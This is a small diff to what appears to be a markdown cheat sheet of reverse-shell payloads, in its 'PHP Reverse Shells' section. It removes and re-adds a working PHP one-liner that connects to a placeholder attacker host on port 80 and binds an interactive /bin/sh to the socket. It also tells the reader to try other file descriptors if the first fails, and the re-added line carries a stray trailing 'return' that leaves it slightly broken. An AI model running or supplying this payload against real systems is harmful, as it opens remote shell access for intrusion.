@@ -30,5 +30,5 @@
 
 ## PHP Reverse Shells
 And 
-> - **php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'**
-And (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
+> - **php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'**   return
+(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
